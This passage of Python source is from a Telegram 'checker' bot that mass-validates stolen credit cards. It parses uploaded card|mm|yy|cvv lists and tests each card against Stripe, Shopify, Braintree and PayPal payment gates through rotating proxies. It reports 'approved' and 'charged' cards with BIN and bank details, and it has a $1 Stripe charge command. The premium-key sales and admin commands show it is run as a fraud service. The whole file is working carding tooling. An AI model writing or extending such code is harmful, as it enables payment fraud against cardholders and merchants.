        f"└ Active Premium: {active_premium}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n"
        f"🤖 Bot Status: 🟢 Online"
    )
    
    await update.message.reply_text(stats_message)

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user list - /users"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    users = load_users()
    
    if not users:
        await update.message.reply_text("❌ No users registered yet!")
        return
    
    from access_control import load_access_data
    access_data = load_access_data()
    premium_users = access_data.get('premium_users', {})
    
    users_list = (
        "╔════════════════════════════╗\n"
        "   👥 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n"
        "╚════════════════════════════╝\n\n"
        f"📊 Total: {len(users)} users\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    for idx, (user_id, user_data) in enumerate(users.items(), 1):
        username = user_data.get('username', 'Unknown')
        registered_at = user_data.get('registered_at', 'N/A')
        is_premium = user_id in premium_users
        
        premium_badge = "💎" if is_premium else "👤"
        
        users_list += f"{premium_badge} {idx}. @{username}\n"
        users_list += f"   🆔 ID: {user_id}\n"
        
        if is_premium:
            expires = premium_users[user_id].get('expires_at', 'N/A')
            try:
                exp_date = datetime.fromisoformat(expires)
                users_list += f"   ⭐ Premium until: {exp_date.strftime('%m/%d/%Y')}\n"
            except:
                users_list += f"   ⭐ Premium: Active\n"
        
        users_list += "\n"
        
        if idx >= 20:
            users_list += f"... and {len(users) - 20} more users\n"
            break
    
    users_list += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    users_list += "💎 = Premium User | 👤 = Regular User"
    
    await update.message.reply_text(users_list)

async def groups_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show authorized groups list - /groups"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    authorized_groups = get_authorized_groups()
    
    if not authorized_groups:
        await update.message.reply_text("❌ No authorized groups yet! Use /addgroup to add one.")
        return
    
    groups_list = (
        "╔═══════════════════════════════╗\n"
        "   🏢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
        "╚═══════════════════════════════╝\n\n"
        f"📊 Total: {len(authorized_groups)} groups\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
        invite_link = group_info.get('invite_link', 'N/A')
        # Escape markdown special characters in link if necessary, but keep it readable
        safe_link = invite_link.replace('_', '\\_').replace('*', '\\*').replace('`', '\\`')
        added_by = group_info.get('added_by', 'Unknown').replace('_', '\\_')
        added_at = group_info.get('added_at', 'N/A')
        
        groups_list += f"🏢 Group {idx}\n"
        groups_list += f"├ 🆔 ID: `{group_id}`\n"
        groups_list += f"├ 🔗 Link: {safe_link}\n"
        groups_list += f"├ 👤 Added by: @{added_by}\n"
        groups_list += f"└ 📅 Date: {added_at}\n\n"
    
    groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    groups_list += "💡 Use /removegroup <id> to remove a group"
    
    await update.message.reply_text(groups_list, parse_mode='Markdown')

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove authorized group - /removegroup <group_id>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "   🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗚𝗥𝗢𝗨𝗣\n"
            "╚══════════════════════════════╝\n\n"
            "📝 Usage:\n"
            "`/removegroup <group_id>`\n\n"
            "Example:\n"
            "`/removegroup -1001234567890`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Use /groups to see all group IDs"
        )
        return
    
    try:
        group_id = context.args[0]
        
        from access_control import load_access_data, save_access_data
        data = load_access_data()
        
        if group_id not in data['authorized_groups']:
            await update.message.reply_text("❌ This group is not in the authorized list!")
            return
        
        group_info = data['authorized_groups'][group_id]
        del data['authorized_groups'][group_id]
        save_access_data(data)
        
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "   ✅ 𝗚𝗥𝗢𝗨𝗣 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
            "╚══════════════════════════════╝\n\n"
            f"🆔 Group ID: `{group_id}`\n"
            f"🔗 Link: {group_info.get('invite_link', 'N/A')}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Users can no longer use the bot in this group.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a premium key - /redeem <key>"""
    if not context.args:
        await update.message.reply_text(
            "Usage: /redeem <key>\n"
            "Example: /redeem premium_abc123xyz456"
        )
        return
    
    key_code = context.args[0]
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    
    success, message = redeem_key(key_code, user_id, username)
    
    if success:
        await update.message.reply_text(
            f"🎉 **Premium Activated!**\n\n"
            f"{message}\n\n"
            "✨ You can now use the bot in private messages!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(message)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document/file uploads - store file info for mass checking"""
    if not update.message or not update.message.document:
        return
    
    document = update.message.document
    file_name = document.file_name
    
    if not file_name.endswith('.txt'):
        await update.message.reply_text(
            "⚠️ Please send a .txt file containing credit cards.\n"
            "Format: card|mm|yy|cvv (one per line)"
        )
        return
    
    context.user_data['cc_file'] = {
        'file_id': document.file_id,
        'file_name': file_name,
        'message_id': update.message.message_id
    }

def parse_cards_from_text(text):
    """Parse credit cards from text content"""
    cards = []
    card_pattern = re.compile(r'(\d{15,16})[|:](\d{1,2})[|:](\d{2,4})[|:](\d{3,4})')
    matches = card_pattern.findall(text)
    
    for match in matches:
        card_num, month, year, cvv = match
        if len(year) == 4:
            year = year[-2:]
        month = month.zfill(2)
        cards.append(f"{card_num}|{month}|{year}|{cvv}")
    
    return cards

async def mass_check_stripe_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Stripe cards from file with live updates"""
    if not update.message.reply_to_message:
        return
    
    sys.path.insert(0, 'gates/stripe')
    import config_manager
    from gates.stripe.main import process_stripe_card, parse_card_data, get_bin_info
    
    reply_to_id = update.message.reply_to_message.message_id
    
    file_info = None
    if 'cc_file' in context.user_data and context.user_data['cc_file'].get('message_id') == reply_to_id:
        file_info = context.user_data['cc_file']
    
    if not file_info:
        raise ApplicationHandlerStop
    
    try:
        file = await context.bot.get_file(file_info['file_id'])
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        cards = parse_cards_from_text(text_content)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file!")
            return
        
        user_id = update.effective_user.id
        username = update.effective_user.username
        is_user_admin = is_admin(user_id, username)
        
        max_cards = len(cards) if is_user_admin else min(len(cards), 50)
        cards = cards[:max_cards]
        
        config = config_manager.get_config()
        stripe_url = config.stripe_url
        auth_mode = config.auth_mode
        shared_email = config.shared_email
        shared_password = config.shared_password
        
        if not stripe_url:
            await update.message.reply_text(
                "⚠️ Stripe URL not configured.\nPlease set it using: /setsurl <url>"
            )
            return
        
        approved_count = 0
        declined_count = 0
        checked_count = 0
        total_cards = len(cards)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: {total_cards}", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_msg = await update.message.reply_text(
            f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Stripe Auth\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total_cards}\n"
            f"🔄 Status: Processing...",
            reply_markup=reply_markup
        )
        
        req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
        
        for i, card_str in enumerate(cards, 1):
            card_data = parse_card_data(card_str)
            if not card_data:
                continue
            
            start_time = time.time()
            bin_info = await get_bin_info(card_data['number'][:6])
            
            is_approved, response_msg = await process_stripe_card(
                stripe_url,
                card_data,
                auth_mode=auth_mode,
                shared_email=shared_email,
                shared_password=shared_password
            )
            
            checked_count += 1
            
            if is_approved:
                approved_count += 1
                time_taken = round(time.time() - start_time, 2)
                
                card_display = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"
                bin_number = card_data['number'][:6]
                
                success_msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
Stripe Auth
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ APPROVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {response_msg}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_info.get('type', 'N/A')}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country', 'N/A')}
𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @mumiru
"""
                await update.message.reply_text(success_msg, parse_mode='HTML')
            else:
                declined_count += 1
            
            left_count = total_cards - checked_count
            
            keyboard = [
                [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
                 InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
                [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
                 InlineKeyboardButton(f"⏳ Left: {left_count}", callback_data="null")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await status_msg.edit_text(
                    f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Stripe Auth\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Total Cards: {total_cards}\n"
                    f"🔄 Status: Checking #{checked_count}...",
                    reply_markup=reply_markup
                )
            except:
                pass
            
            await asyncio.sleep(2.5)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: 0", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            f"✅ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 - Stripe Auth\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {total_cards} | ✅ Approved: {approved_count} | ❌ Declined: {declined_count}\n"
            f"🎯 Success Rate: {round((approved_count/total_cards)*100, 1)}%",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def mass_check_shopify_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Shopify cards from file with live updates"""
    if not update.message.reply_to_message:
        return
    
    sys.path.insert(0, 'gates/shopify')
    from gates.shopify.main import GLOBAL_SETTINGS, get_next_proxy
    from shopify_auto_checkout import ShopifyChecker
    import httpx
    
    reply_to_id = update.message.reply_to_message.message_id
    
    file_info = None
    if 'cc_file' in context.user_data and context.user_data['cc_file'].get('message_id') == reply_to_id:
        file_info = context.user_data['cc_file']
    
    if not file_info:
        raise ApplicationHandlerStop
    
    if not GLOBAL_SETTINGS.get('url'):
        await update.message.reply_text("❌ No Shopify URL set! Use /seturl first.")
        return
    
    try:
        file = await context.bot.get_file(file_info['file_id'])
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        cards = parse_cards_from_text(text_content)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file!")
            return
        
        user_id = update.effective_user.id
        username = update.effective_user.username
        is_user_admin = is_admin(user_id, username)
        
        max_cards = len(cards) if is_user_admin else min(len(cards), 50)
        cards = cards[:max_cards]
        
        approved_count = 0
        declined_count = 0
        checked_count = 0
        total_cards = len(cards)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: {total_cards}", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_msg = await update.message.reply_text(
            f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Shopify\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total_cards}\n"
            f"🔄 Status: Processing...",
            reply_markup=reply_markup
        )
        
        req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
        
        for i, card_str in enumerate(cards, 1):
            parts = card_str.split('|')
            if len(parts) != 4:
                continue
            
            card_num, month, year, cvv = parts
            
            start_time = time.time()
            proxy = get_next_proxy()
            
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    bin_response = await client.get(f"https://bins.antipublic.cc/bins/{card_num[:6]}")
                    bin_info = bin_response.json() if bin_response.status_code == 200 else {}
            except:
                bin_info = {}
            
            result = "Unknown Error"
            
            try:
                checker = ShopifyChecker(proxy=proxy)
                result_data = await asyncio.wait_for(
                    checker.check_card(
                        site_url=GLOBAL_SETTINGS['url'],
                        card_num=card_num,
                        month=month,
                        year=year,
                        cvv=cvv
                    ),
                    timeout=30.0
                )
                
                if isinstance(result_data, dict):
                    result = result_data.get('message', 'Card Declined')
                elif isinstance(result_data, str):
                    result = result_data
                elif result_data is None:
                    result = "No Response"
                else:
                    result = "Card Declined"
            except asyncio.TimeoutError:
                result = "Timeout"
            except Exception as e:
                result = f"Error: {str(e)}"
                logger.error(f"Shopify check error for card {card_num[:6]}**: {e}")
            
            checked_count += 1
            
            if not result or not isinstance(result, str):
                result = "Unknown Error"
            
            result_lower = str(result).lower()
            is_approved = "✅" in result or "charged" in result_lower or "order placed" in result_lower or "card live" in result_lower or "approved" in result_lower
            
            if is_approved:
                approved_count += 1
                time_taken = round(time.time() - start_time, 2)
                
                bin_num = card_num[:6]
                brand = bin_info.get('brand', 'N/A')
                card_type = bin_info.get('type', 'N/A')
                country_flag = bin_info.get('country_flag', '')
                country_name = bin_info.get('country_name', 'N/A')
                bank = bin_info.get('bank', 'N/A')
                country_display = f"{country_flag} {country_name}"
                
                success_msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝗦𝗛𝗢𝗣𝗜𝗙𝗬
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_str}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ APPROVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_num}
𝐓𝐘𝐏𝐄 ➜ {card_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {country_display}
𝐁𝐀𝐍𝐊 ➜ {bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @MUMIRU
"""
                await update.message.reply_text(success_msg, parse_mode='HTML')
            else:
                declined_count += 1
            
            left_count = total_cards - checked_count
            
            keyboard = [
                [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
                 InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
                [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
                 InlineKeyboardButton(f"⏳ Left: {left_count}", callback_data="null")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await status_msg.edit_text(
                    f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Shopify\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Total Cards: {total_cards}\n"
                    f"🔄 Status: Checking #{checked_count}...",
                    reply_markup=reply_markup
                )
            except:
                pass
            
            await asyncio.sleep(2.5)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: 0", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            f"✅ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 - Shopify\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {total_cards} | ✅ Approved: {approved_count} | ❌ Declined: {declined_count}\n"
            f"🎯 Success Rate: {round((approved_count/total_cards)*100, 1)}%",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

def extract_cc_from_text(text: str) -> Optional[Dict[str, str]]:
    """Extract credit card from text - supports multiple formats"""
    patterns = [
        r'(\d{15,16})[|:/\s]+(\d{1,2})[|:/\s]+(\d{2,4})[|:/\s]+(\d{3,4})',
        r'(\d{15,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            year = match.group(3)
            if len(year) == 2:
                year = '20' + year
            return {
                'number': match.group(1),
                'month': match.group(2).zfill(2),
                'year': year,
                'cvv': match.group(4)
            }
    return None


async def check_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check proxy - /proxy <proxy_string>"""
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   🔌 𝗣𝗥𝗢𝗫𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /proxy <proxy>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Supported Formats:\n"
            "• ip:port\n"
            "• ip:port:user:pass\n"
            "• http://ip:port\n"
            "• https://ip:port\n"
            "• socks4://ip:port\n"
            "• socks5://ip:port\n"
            "• socks5://user:pass@ip:port\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Example: /proxy 185.199.228.220:7300\n"
            "Example: /proxy socks5://user:pass@1.2.3.4:1080",
            parse_mode='Markdown'
        )
        return
    
    proxy_string = ' '.join(context.args)
    
    msg = await update.message.reply_text(
        "╔═══════════════════════════════╗\n"
        "   🔌 𝗣𝗥𝗢𝗫𝗬 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...\n"
        "╚═══════════════════════════════╝\n\n"
        "⏳ Testing proxy connection...\n"
        "🔄 Fetching IP info...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    try:
        result = await check_proxy_func(proxy_string)
        formatted = format_proxy_result(result)
        await msg.edit_text(formatted, parse_mode='HTML')
    except Exception as e:
        await msg.edit_text(f"❌ Error checking proxy: {str(e)}")


async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user - /ban <user_id> or reply"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    target_id = None
    target_username = "Unknown"
    
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
        target_username = update.message.reply_to_message.from_user.username or "Unknown"
    elif context.args:
        try:
            target_id = int(context.args[0])
            target_username = context.args[1] if len(context.args) > 1 else "Unknown"
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
    else:
        await update.message.reply_text("❌ Usage: /ban <user_id> or reply to user")
        return
    
    if is_admin(target_id):
        await update.message.reply_text("❌ Cannot ban admins!")
        return
    
    ban_user(target_id, target_username, f"@{username}" if username else str(user_id))
    
    await update.message.reply_text(
        "╔═══════════════════════════════╗\n"
        "   🚫 𝗨𝗦𝗘𝗥 𝗕𝗔𝗡𝗡𝗘𝗗\n"
        "╚═══════════════════════════════╝\n\n"
        f"🆔 User ID: `{target_id}`\n"
        f"👤 Username: @{target_username}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "❌ This user can no longer use the bot.",
        parse_mode='Markdown'
    )


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user - /unban <user_id>"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    target_id = None
    
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
    elif context.args:
        try:
            target_id = int(context.args[0])
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
    else:
        await update.message.reply_text("❌ Usage: /unban <user_id> or reply to user")
        return
    
    if unban_user(target_id):
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   ✅ 𝗨𝗦𝗘𝗥 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗\n"
            "╚═══════════════════════════════╝\n\n"
            f"🆔 User ID: `{target_id}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ User can now use the bot again.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ User was not banned!")


async def sban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Silent ban (no notification) - /sban <user_id>"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        return
    
    target_id = None
    target_username = "Unknown"
    
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
        target_username = update.message.reply_to_message.from_user.username or "Unknown"
        try:
            await update.message.delete()
        except:
            pass
    elif context.args:
        try:
            target_id = int(context.args[0])
            target_username = context.args[1] if len(context.args) > 1 else "Unknown"
            try:
                await update.message.delete()
            except:
                pass
        except:
            return
    else:
        return
    
    if is_admin(target_id):
        return
    
    ban_user(target_id, target_username, f"@{username}" if username else str(user_id))


async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Restart the bot - admin only"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    await update.message.reply_text(
        "╔═══════════════════════════════╗\n"
        "   🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗕𝗢𝗧\n"
        "╚═══════════════════════════════╝\n\n"
        "⏳ Bot is restarting...\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    import sys
    import os
    os.execv(sys.executable, [sys.executable] + sys.argv)


async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot ping/latency"""
    start_time = time.time()
    msg = await update.message.reply_text("🏓 Pinging...")
    end_time = time.time()
    
    latency = round((end_time - start_time) * 1000, 2)
    
    await msg.edit_text(
        "╔═══════════════════════════════╗\n"
        "   🏓 𝗣𝗢𝗡𝗚!\n"
        "╚═══════════════════════════════╝\n\n"
        f"⚡ Latency: {latency}ms\n"
        f"🟢 Bot Status: Online\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )


async def rmpre_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove premium from user - /rmpre <user_id>"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    target_id = None
    
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
    elif context.args:
        try:
            target_id = int(context.args[0])
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
    else:
        await update.message.reply_text("❌ Usage: /rmpre <user_id> or reply to user")
        return
    
    if remove_premium(target_id):
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   ✅ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
            "╚═══════════════════════════════╝\n\n"
            f"🆔 User ID: `{target_id}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ Premium access has been revoked.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ User doesn't have premium!")


async def check_shopify_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Shopify by replying to a message containing CC"""
    if not update.message.reply_to_message:
        return
    
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
    card_data = extract_cc_from_text(replied_text)
    
    if not card_data:
        await update.message.reply_text("❌ No valid CC found in replied message!")
        return
    
    context.args = [f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"]
    await check_shopify(update, context)


async def check_stripe_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Stripe by replying to a message containing CC"""
    if not update.message.reply_to_message:
        return
    
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
    card_data = extract_cc_from_text(replied_text)
    
    if not card_data:
        await update.message.reply_text("❌ No valid CC found in replied message!")
        return
    
    context.args = [f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"]
    await check_stripe(update, context)


async def check_braintree_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Braintree by replying to a message containing CC"""
    if not update.message.reply_to_message:
        return
    
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
    card_data = extract_cc_from_text(replied_text)
    
    if not card_data:
        await update.message.reply_text("❌ No valid CC found in replied message!")
        return
    
    context.args = [f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"]
    await check_braintree(update, context)


async def check_paypal_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check PayPal by replying to a message containing CC"""
    if not update.message.reply_to_message:
        return
    
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
    card_data = extract_cc_from_text(replied_text)
    
    if not card_data:
        await update.message.reply_text("❌ No valid CC found in replied message!")
        return
    
    context.args = [f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"]
    await check_paypal(update, context)


async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Charge single check - /st CC|MM|YY|CVV"""
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "Unknown"
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    card_data = None
    
    if update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_data = extract_cc_from_text(replied_text)
    
    if not card_data and context.args:
        card_input = ' '.join(context.args)
        card_data = extract_cc_from_text(card_input)
    
    if not card_data:
        await update.message.reply_text(
            "╔═══════════════════════════════╗\n"
            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $1\n"
            "╚═══════════════════════════════╝\n\n"
            "Usage: /st CC|MM|YY|CVV\n"
            "Example: /st 5484460739505683|04|29|280\n\n"
            "Or reply to a message containing CC with /st"
        )
        return
    
    checking_msg = await update.message.reply_text("⏳ Checking Stripe Charge...")
    
    bin_number = card_data['number'][:6]
    bin_info = await get_bin_info(bin_number)
    vbv_info = await get_vbv_info(card_data['number'])
    
    start_time = time.time()
    result = await asyncio.to_thread(
        stripe_charge_check,
        card_data['number'],
        card_data['month'],
        card_data['year'],
        card_data['cvv']
    )
    time_taken = round(time.time() - start_time, 2)
    
    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
    cc_escaped = html.escape(cc_display)
    
    if result['status'] == 'CHARGED':
        status_text = "CHARGED 💳"
    elif result['status'] == 'APPROVED':
        status_text = "APPROVED ✅"
    elif result['status'] == 'DECLINED':
        status_text = "DECLINED ❌"
    else:
        status_text = f"{result['status']} ⚠️"
    
